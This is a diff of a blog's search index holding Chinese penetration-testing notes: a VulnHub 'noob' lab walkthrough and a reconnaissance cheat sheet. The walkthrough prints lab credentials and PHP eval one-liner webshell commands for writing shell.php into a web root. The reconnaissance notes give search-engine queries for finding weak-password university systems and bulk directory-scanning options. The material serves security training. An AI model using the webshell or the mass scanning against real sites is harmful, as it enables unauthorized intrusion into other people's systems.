-<h3 id="原因"><a href="#原因" class="headerlink" title="原因:"></a>原因:</h3><p>1.Windows：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo ^&lt;? php @eval($_POST[&#x27;x&#x27;]); ?^&gt; &gt;shell.php</span><br></pre></td></tr></table></figure>
-
-<p>知识点：</p>
-<p>（1）^以转义字符的身份出现。因为在cmd环境中，有些字符具备特殊功能，如&gt;、&gt;&gt;表示重定向，|表示管道，&amp;、&amp;&amp;、||表示语句连接……它们都有特定的功度能，如果需要把它们作为字符输出知的话，echo &gt;、echo | ……之类的写法就会出错——cmd解释器会把它们作为具有特殊功能的字符对待，而不会作为普通字符处理，这个时候，就需道要对这些特殊字符做转义处理：在每个特殊字符回前加上转义字符^答，因此，要输出这些特殊字符，就需要用 echo ^&gt;、echo ^|、echo ^|^|、echo ^^……之类的格式来处理。此处转义&lt;和&gt;</p>
-<p>（2） 此处^为什么不换成引号？因为windows写入时会把引号写进去</p>
-<p>2.Linux:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;? php @eval($_POST[&quot;x&quot;]); ?&gt;&#x27; &gt;shell.php</span><br></pre></td></tr></table></figure>
-
-<p>知识点：</p>
-<p>$为linux系统的变量符号，原样输出字符串，不进行转义或取变量用单引号（此处否则会把$_POST当成变量处理）,x用双引号是为了和单引号区分</p>
-<h4 id="其次"><a href="#其次" class="headerlink" title="其次"></a>其次</h4><p>我们要写入网站的目录文件里面才能远程链接到shell</p>
-<p>失败了,我找不到网站根目录在哪里.</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E5%9B%BE%E7%89%8720221101184629.gif"></p>
-<p>。。。。。。。。。。。。。</p>
-<h1 id="找到网站根目录"><a href="#找到网站根目录" class="headerlink" title="找到网站根目录"></a>找到网站根目录</h1><p>默认路径: /var/www/html</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101194829.png"></p>
-<p>发现前面的shell.php文件和test.php文件没能执行</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101195012.png"></p>
-<p>shell.php木马也没能在蚁剑上成功链接.</p>
-<p>但test.txt文件是可以成功显示的</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101195238.png"></p>
-<p>说明这样尝试是成功的.</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>本次靶机的难度很低,最重要的就是使用nmap和Linux命令,</p>
-<p>图片隐写技术在现实生活中很少能用的上,主要就是ctf比赛里面的应用,所以本次我并没有花时间篇幅去使用.</p>
-<p>这次的靶机在我看来强调的就是ftp服务和ssh远程登录服务</p>
-<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>ftp协议用于计算机与计算机之间的数据传输文件传输,不同于HTTP协议.ftp服务默认开启21端口,使用账号密码登录(设置后),也可以匿名登录(不安全).</p>
-<p>链接:<a href="https://www.cnblogs.com/peterYong/p/8630542.html">【FTP】详解 - peterYong - 博客园 (cnblogs.com)</a></p>
-<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>ssh协议是用来支持远程登录的协议,也可以在有限制的条件下进行文件传输与读取.</p>
-<p>链接:<a href="https://blog.csdn.net/m0_52165864/article/details/126028681"> SSH服务详解_欢喜躲在眉梢里的博客-CSDN博客_ssh服务</a></p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-      </categories>
-      <tags>
-        <tag>靶场渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -651,6 +548,120 @@
       </categories>
       <tags>
         <tag>靶场渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vlunhub noob靶场总结</title>
+    <url>/2022/11/01/14-23-40/</url>
+    <content><![CDATA[<h2 id="又开了新的vlunhub靶场—–noob靶场（菜鸟）"><a href="#又开了新的vlunhub靶场—–noob靶场（菜鸟）" class="headerlink" title="又开了新的vlunhub靶场—–noob靶场（菜鸟）"></a>又开了新的vlunhub靶场—–noob靶场（菜鸟）</h2><h1 id="首先还是先讲述遇到的问题："><a href="#首先还是先讲述遇到的问题：" class="headerlink" title="首先还是先讲述遇到的问题："></a>首先还是先讲述遇到的问题：</h1><h2 id="ftp服务浏览器访问不了"><a href="#ftp服务浏览器访问不了" class="headerlink" title="ftp服务浏览器访问不了"></a>ftp服务浏览器访问不了</h2><p>这个问题困扰许久，搜了好久说的好像都是浏览器的问题，到了现在许多浏览器都不支持链接到网站的ftp服务了。</p>
+<h3 id="解决方式："><a href="#解决方式：" class="headerlink" title="解决方式："></a>解决方式：</h3><p>使用文件夹打开的方式：</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101143315.png"></p>
+<p>如图所示在文件夹搜索框输入：<a href="ftp://192.168.50.130/">ftp://192.168.50.130</a>  就能直接链接到ftp服务了，但注意在本次的靶机上此ftp服务是默认无密码的形式开启的，有的ftp服务是需要输入账号密码的。本次靶机限定了读取和下载功能不能修改和上传.  (也是,如果能修改和上传直接改成一句话木马不就行了)</p>
+<h1 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h1><p>在开始之前我们都要知道如何查找靶机的IP地址</p>
+<h3 id="查找攻击机IP："><a href="#查找攻击机IP：" class="headerlink" title="查找攻击机IP："></a>查找攻击机IP：</h3><p>Linux：ifconfig</p>
+<p>Windows：ipconfig</p>
+<h3 id="网段扫描：-发现靶机IP"><a href="#网段扫描：-发现靶机IP" class="headerlink" title="网段扫描：(发现靶机IP)"></a>网段扫描：(发现靶机IP)</h3><p>kili: netdiscover -r 192.168.50.1/24</p>
+<p>本次靶机相对于之前的earth靶机更容易，主要信息收集手段为nmap</p>
+<p>使用nmap命令:</p>
+<h3 id="使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务"><a href="#使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务" class="headerlink" title="使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务"></a>使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务</h3><p>命令： nmap -sV -Pn -sT -sC -A -p- 192.168.50.130</p>
+<p>（应该开单章来说明一下信息收集中的工具命令）</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101150614.png"></p>
+<p>如图所示,标下划线的为开启的服务，图中就能看出全端口扫描的作用</p>
+<h1 id="通过ftp服务获取网站的登录账号密码"><a href="#通过ftp服务获取网站的登录账号密码" class="headerlink" title="通过ftp服务获取网站的登录账号密码"></a>通过ftp服务获取网站的登录账号密码</h1><p>如开头中所粘贴的图片所示，在ftp服务里将其中的两个文件下载到本地</p>
+<p>在cre.txt 文件中得到一串base64加密过的字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Y2hhbXA6cGFzc3dvcmQ=</span><br></pre></td></tr></table></figure>
+
+<p>解密得:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">champ:password</span><br></pre></td></tr></table></figure>
+
+<p>使用账号密码登录:(当然在得到这个账号密码前肯定在这个登陆界面进行过其他的测试,如弱口令,注入等)</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101151446.png"></p>
+<p>登陆成功,在箭头所指的功能点,我们获取到一个.rar压缩文件.</p>
+<h1 id="图片隐写破译"><a href="#图片隐写破译" class="headerlink" title="图片隐写破译"></a>图片隐写破译</h1><p>如图</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101151836.png"></p>
+<p>在下载下的压缩文件里看到两张图片,根据攻略可知里面包含了图片隐写.(不看攻略你知道有这东西?实战里有谁会丧心病狂的将自己的账号密码隐写放在图片中.)</p>
+<p>参考链接:<a href="https://www.cnblogs.com/sainet/p/15667985.html">Vulnhub 靶场 NOOB: 1 - sainet - 博客园 (cnblogs.com)</a></p>
+<p>具体破译我就不尝试了,直接抄袭</p>
+<p>最后得到ssh服务的登录账号密码:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wtf:this one is a simple one</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="登录ssh"><a href="#登录ssh" class="headerlink" title="登录ssh"></a>登录ssh</h1><p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101152924.png"></p>
+<p>如图箭头所示:</p>
+<p>成功远程登陆上ssh服务</p>
+<p>可以使用lastlog命令查看这台靶机的可以登录的账号以及登陆历史</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101154430.png"></p>
+<p>有一些是我在测试时添加到账号.</p>
+<h1 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VGhlIGZsYWcgaXMgdGhlIGVuY29kZWQgc3RyaW5nIGl0c2VsZg</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101155258.png"></p>
+<p>从这张图可以看出我的历程,Linux命令不熟悉.</p>
+<h1 id="尝试"><a href="#尝试" class="headerlink" title="尝试:"></a>尝试:</h1><p>在看了这两个协议后,我想通过这两个协议上传webshell</p>
+<h2 id="尝试一"><a href="#尝试一" class="headerlink" title="尝试一:"></a>尝试一:</h2><p>使用ssh协议进行文件.</p>
+<p>命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp /home/wugezhang/test.php wtf@192.168.50.130:/home/wtf/Downloads</span><br></pre></td></tr></table></figure>
+
+<p>不成功:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh: connect to host 192.168.50.130 port 22: Connection refused</span><br><span class="line">scp: Connection closed </span><br><span class="line"></span><br><span class="line">ssh：连接到主机 192.168.50.130 端口 22：连接被拒绝</span><br><span class="line">SCP：连接已关闭</span><br></pre></td></tr></table></figure>
+
+<p>一系列操作后发现不现实,如果能在对方环境添加环境变量更改设置了那传不传shell也无所谓了.</p>
+<p>但做好权限维持才是持久的道理.</p>
+<h2 id="尝试二"><a href="#尝试二" class="headerlink" title="尝试二:"></a>尝试二:</h2><p>使用匿名的ftp协议服务进行文件上传shell</p>
+<p>尝试将文件上传进ftp服务的文件夹但失败了,我们只有下载与读的权限,没有上传与修改权限.</p>
+<h2 id="尝试三"><a href="#尝试三" class="headerlink" title="尝试三:"></a>尝试三:</h2><p>尝试直接使用命令写入一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_post[test]);?&gt;&quot; &gt; test.php</span><br></pre></td></tr></table></figure>
+
+<p>但失败了,在命令里直接就将$_post给执行了</p>
+<h3 id="原因"><a href="#原因" class="headerlink" title="原因:"></a>原因:</h3><p>1.Windows：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo ^&lt;? php @eval($_POST[&#x27;x&#x27;]); ?^&gt; &gt;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>知识点：</p>
+<p>（1）^以转义字符的身份出现。因为在cmd环境中，有些字符具备特殊功能，如&gt;、&gt;&gt;表示重定向，|表示管道，&amp;、&amp;&amp;、||表示语句连接……它们都有特定的功度能，如果需要把它们作为字符输出知的话，echo &gt;、echo | ……之类的写法就会出错——cmd解释器会把它们作为具有特殊功能的字符对待，而不会作为普通字符处理，这个时候，就需道要对这些特殊字符做转义处理：在每个特殊字符回前加上转义字符^答，因此，要输出这些特殊字符，就需要用 echo ^&gt;、echo ^|、echo ^|^|、echo ^^……之类的格式来处理。此处转义&lt;和&gt;</p>
+<p>（2） 此处^为什么不换成引号？因为windows写入时会把引号写进去</p>
+<p>2.Linux:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;? php @eval($_POST[&quot;x&quot;]); ?&gt;&#x27; &gt;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>知识点：</p>
+<p>$为linux系统的变量符号，原样输出字符串，不进行转义或取变量用单引号（此处否则会把$_POST当成变量处理）,x用双引号是为了和单引号区分</p>
+<h4 id="其次"><a href="#其次" class="headerlink" title="其次"></a>其次</h4><p>我们要写入网站的目录文件里面才能远程链接到shell</p>
+<p>失败了,我找不到网站根目录在哪里.</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E5%9B%BE%E7%89%8720221101184629.gif"></p>
+<p>。。。。。。。。。。。。。</p>
+<h1 id="找到网站根目录"><a href="#找到网站根目录" class="headerlink" title="找到网站根目录"></a>找到网站根目录</h1><p>默认路径: /var/www/html</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101194829.png"></p>
+<p>发现前面的shell.php文件和test.php文件没能执行</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101195012.png"></p>
+<p>shell.php木马也没能在蚁剑上成功链接.</p>
+<p>但test.txt文件是可以成功显示的</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101195238.png"></p>
+<p>说明这样尝试是成功的.</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>本次靶机的难度很低,最重要的就是使用nmap和Linux命令,</p>
+<p>图片隐写技术在现实生活中很少能用的上,主要就是ctf比赛里面的应用,所以本次我并没有花时间篇幅去使用.</p>
+<p>这次的靶机在我看来强调的就是ftp服务和ssh远程登录服务</p>
+<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>ftp协议用于计算机与计算机之间的数据传输文件传输,不同于HTTP协议.ftp服务默认开启21端口,使用账号密码登录(设置后),也可以匿名登录(不安全).</p>
+<p>链接:<a href="https://www.cnblogs.com/peterYong/p/8630542.html">【FTP】详解 - peterYong - 博客园 (cnblogs.com)</a></p>
+<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>ssh协议是用来支持远程登录的协议,也可以在有限制的条件下进行文件传输与读取.</p>
+<p>链接:<a href="https://blog.csdn.net/m0_52165864/article/details/126028681"> SSH服务详解_欢喜躲在眉梢里的博客-CSDN博客_ssh服务</a></p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>靶场渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网学习笔记</title>
+    <url>/2022/10/19/10-49-13/</url>
+    <content><![CDATA[<h1 id="内网学习记录"><a href="#内网学习记录" class="headerlink" title="内网学习记录"></a>内网学习记录</h1>]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网学习</tag>
       </tags>
   </entry>
   <entry>
@@ -881,14 +892,70 @@
       </tags>
   </entry>
   <entry>
-    <title>内网学习笔记</title>
-    <url>/2022/10/19/10-49-13/</url>
-    <content><![CDATA[<h1 id="内网学习记录"><a href="#内网学习记录" class="headerlink" title="内网学习记录"></a>内网学习记录</h1>]]></content>
+    <title>日常收集1</title>
+    <url>/2024/03/26/16-29-21/</url>
+    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>鹰图 ：</p>
+<p>web.title=”XX大学”&amp;&amp;web.body=”登陆”&amp;&amp;web.body=”注册”（fofa也可以）</p>
+<p>fofa语法：</p>
+<p>“系统” &amp;&amp; org=“China Education and Research Network Center”（edu src）</p>
+<p>阅卷系统、评分系统、直播系统、录播系统。（我们需要找的是弱口令能进去的系统）</p>
+<p>找同一个就比较简单了，例如同样的路径地址，同样的ico，同样的js文件，body中同样的字符等等，都可以成为搜索条件。</p>
+<p>使用fofa进行同类查找</p>
+<p>fofa: </p>
+<p>domain=”xxx.com”&amp;&amp;header=200</p>
+<p>快速筛选存活</p>
+<p>不过现在一般我都采用灯塔系统<a href="https://blog.csdn.net/weixin_44268918/article/details/134121137">ARL灯塔安装与使用-CSDN博客</a>进行一站式信息收集了</p>
+<p> 挖掘敏感信息泄露，使用fofa进行批量提取url后，使用工具httpx对网站url判断存活，提前收集好信息泄露路径，例如：/api/user ，/api/usernames ，/api/admin ，还有springboot收集的路径，使用工具进行盲打，适合公益漏洞挖掘。用到了一个浏览器的插件（open multiple urls），可以快速打开多个ip</p>
+<p>批量收集好网站url后使用dirsearch进行批量的敏感路径爆破</p>
+<p>dirsearch使用命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u,--url                   目标url -l,--url-list=FILE          目标url文件路径 </span><br><span class="line">-e,--extensions             包含的文件拓展名(逗号分隔)  如-e php,asp   </span><br><span class="line">-X,--exclude-extensions     排除的文件拓展名(逗号分隔)  如-X asp,jsp </span><br><span class="line">-f,--force-extensions       在字典的每条记录后面添加文件拓展名 </span><br><span class="line">-L,                         批量扫描  如 -L url.txt</span><br></pre></td></tr></table></figure>
+
+<p>字典设置:</p>
+<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">-w,<span class="attr">--wordlists</span>              自定义<span class="built_in">wordlist</span>(以逗号分隔)</span><br><span class="line"><span class="attr">--prefixes</span>                  添加自定义前缀</span><br><span class="line"><span class="attr">--suffixes</span>			        添加自定义后缀</span><br><span class="line"><span class="attr">--only-selected</span>      	    筛选出指定的文件拓展名或无文件拓展名的目录</span><br><span class="line"><span class="attr">--remove-extensions</span>   	    移除所有wordlist的后缀名 (admin.php --&gt; admin)</span><br><span class="line">-U, <span class="attr">--uppercase</span>      	    将字典转换为大写</span><br><span class="line">-L, <span class="attr">--lowercase</span>		 	    将字典转换为小写</span><br><span class="line">-C, <span class="attr">--capital</span>        	    第一个字母大写剩下字母小写</span><br></pre></td></tr></table></figure>
+
+<p>响应结果的过滤</p>
+<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">-<span class="selector-tag">i</span>                    		保留的响应状态码(以逗号分隔,支持指定范围) 如(-i <span class="number">200</span>,<span class="number">300</span>-<span class="number">399</span>)</span><br><span class="line">-x                    		排除的响应状态码(以逗号分隔,支持指定范围)  如(-x <span class="number">301</span>,<span class="number">500</span>-<span class="number">599</span>)</span><br><span class="line"><span class="attr">--exclude-sizes</span>             通过大小排除(以逗号分隔) 如(<span class="number">123</span>B,<span class="number">4</span>KB)</span><br><span class="line"><span class="attr">--exclude-texts</span>     		通过文本内容排除响应(&#x27;Not found&#x27;, &#x27;Error&#x27;)</span><br><span class="line"><span class="attr">--exclude-regexps</span>  			通过正则匹配排除响应(&#x27;Not foun[a-z]&#123;<span class="number">1</span>&#125;&#x27;, &#x27;^Error$&#x27;)</span><br><span class="line"><span class="attr">--exclude-redirects</span> 		通过正则跳转目标排除响应(&#x27;https://okta.com/*&#x27;)</span><br><span class="line"><span class="attr">--minimal</span> 					最小响应报文长度</span><br><span class="line"><span class="attr">--maximal</span> 					最大响应报文长度</span><br></pre></td></tr></table></figure>
+
+<p>请求相关设置</p>
+<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">-m,<span class="comment">--http-method    	    HTTP请求方法 默认为GET</span></span><br><span class="line">-d,<span class="comment">--data   				HTTP请求数据</span></span><br><span class="line">-H,<span class="comment">--header  				请求头 如(-H &#x27;Referer: example.com&#x27; -H &#x27;Accept: */*&#x27;)</span></span><br><span class="line"><span class="comment">--header-list=FILE  		从文件中读取请求头</span></span><br><span class="line">-F,<span class="comment">--follow-redirects  	    跟随HTTP跳转</span></span><br><span class="line"><span class="comment">--user-agent  			    设置user-agent字段</span></span><br><span class="line"><span class="comment">--cookie  				 	设置cookie</span></span><br></pre></td></tr></table></figure>
+
+<p>连接相关设置</p>
+<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">	<span class="comment">--timeout=TIMEOUT     		连接超时时间</span></span><br><span class="line"><span class="comment">--ip=IP   					服务器ip地址</span></span><br><span class="line">-s DELAY, <span class="comment">--delay=DELAY     每次请求间隔的时间</span></span><br><span class="line"><span class="comment">--proxy=PROXY   			代理url 支持HTTP和SOCKS代理 如(localhost:8080, socks5://localhost:8088)</span></span><br><span class="line"><span class="comment">--proxy-list=FILE 		    包含代理服务器的地址</span></span><br><span class="line"><span class="comment">--matches-proxy=PROXY       Proxy to replay with found paths</span></span><br><span class="line"><span class="comment">--scheme   					默认的策略 用于从文件中导入请求或url中不包含协议</span></span><br><span class="line"><span class="comment">--max-retries 			    最大重连次数</span></span><br><span class="line">-b,<span class="comment">--request-by-hostname 	强制通过域名连接，(默认为了速度,使用ip连接)</span></span><br><span class="line"><span class="comment">--exit-on-error    		    出现错误时退出</span></span><br><span class="line"><span class="comment">--debug					    Debug模式</span></span><br></pre></td></tr></table></figure>
+
+<p>其余</p>
+<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">	-r,<span class="comment">--recursive        	    递归爆破</span></span><br><span class="line">-R,<span class="comment">--recursion-depth  		最大递归的层数，最大递归级别（子目录）（默认值：0[无限]）</span></span><br><span class="line">-t,<span class="comment">--threads         		线程数</span></span><br><span class="line"><span class="comment">--subdirs             		扫描子目录 如(admin/ 则www.example.com/admin/+字典)</span></span><br><span class="line"><span class="comment">--exclude-subdirs     		在递归扫描中排除的子目录</span></span><br><span class="line">-q,<span class="comment">--quiet-mode             安静模式</span></span><br><span class="line"><span class="comment">--full-url                  打印出完整的url</span></span><br><span class="line"><span class="comment">--no-color                  无颜色输出信息                </span></span><br><span class="line">    <span class="comment">--stop-on-error     发生错误时停止</span></span><br><span class="line">  <span class="comment">--random-agents, --random-user-agents    随机代理，--随机用户代理</span></span><br><span class="line">   <span class="comment">--ua=USERAGENT, --user-agent=USERAGENT   用户代理			</span></span><br><span class="line">   -F, <span class="comment">--follow-redirects                   --遵循重定向</span></span><br><span class="line">  <span class="comment">--exclude-regexps=EXCLUDEREGEXPS         按regexp排除响应，用逗号分隔(示例： &quot;Not foun[a-z]&#123;1&#125;&quot;, &quot;^Error$&quot;)</span></span><br><span class="line">   -s DELAY, <span class="comment">--delay=DELAY                  请求之间的延迟（浮点数）</span></span><br></pre></td></tr></table></figure>
+
+<p>报告</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">--simple-report</span>=SIMPLEOUTPUTFILE         简单输出文件 只找到路径</span><br><span class="line">                    </span><br><span class="line"><span class="attr">--plain-text-report</span>=PLAINTEXTOUTPUTFILE  纯文本输出文件 找到带有状态代码的路径</span><br><span class="line">                    </span><br><span class="line"><span class="attr">--json-report</span>=JSONOUTPUTFILE             JSON输出文件</span><br></pre></td></tr></table></figure>
+
+<h2 id="网站js文件接口路径提取"><a href="#网站js文件接口路径提取" class="headerlink" title="网站js文件接口路径提取"></a>网站js文件接口路径提取</h2><p>配合上面的将存活网站提取出来后就可以进行存活网站测试</p>
+<p>使用findsomething直接在浏览器中提取，方便快捷但会导致浏览器很卡</p>
+<p>使用jsfinder进行更细致的提取</p>
+<p>packerFuzzer 可将webpack前端打包器中的路径进行提取，该工具对所构建的网站进行一键扫描的Packer Fuzzer</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/rtcatc/Packer-Fuzzer</span><br></pre></td></tr></table></figure>
+
+<p>支持自动模糊提取对应目标站点的API以及API对应的参数内容，未授权访问、敏感信息泄露、CORS、SQL注入、水平越权、弱口令、任意文件上传七大漏洞，最后可以生成doc pdf之类的报告</p>
+<p>   JSFinder  js文件深度利用工具</p>
+<p>   云枚举系列：使用fuff找AWS Buckets</p>
+<p>   C编写的高速智能Web目录和文件枚举工具：Lulzbuster</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载地址：git clone https://github.com/noptrix/lulzbuster.git</span><br><span class="line"></span><br><span class="line">自动识别 JS 文件中 URL 节点信息：</span><br><span class="line"></span><br><span class="line">$ git clone https://github.com/GerbenJavado/LinkFinder.git</span><br><span class="line"></span><br><span class="line">$ cd LinkFinder</span><br><span class="line"></span><br><span class="line">$ python setup.py install$ pip3 install -r requirements.txt</span><br><span class="line"></span><br><span class="line">https://github.com/GerbenJavado/LinkFinder</span><br><span class="line"></span><br><span class="line">一款SRC代理扫描器：</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/depycode/p/17079397.html</span><br><span class="line"></span><br><span class="line">https://github.com/depycode/burpsuite_hack</span><br></pre></td></tr></table></figure>
+
+
+
+<p>工具使用：</p>
+<p>Httpx使用，已存</p>
+<p>Jsfinder脚本的使用</p>
+<p>脚本已经放入到kali里面，就在桌面上，我还在f盘的压缩工具备份里面放了一个备份</p>
+<p>具体使用方法</p>
+<p>参考readme.md文件</p>
+<p>快速使用方法：-u 以及 -ou</p>
+<p> <img src="/../../imgs/$%7Bfiilename%7D/20220802182639_35281.jpg" alt="原神"></p>
+]]></content>
       <categories>
-        <category>内网</category>
+        <category>日常收集系列</category>
       </categories>
       <tags>
-        <tag>内网学习</tag>
+        <tag>日常收集</tag>
       </tags>
   </entry>
   <entry>
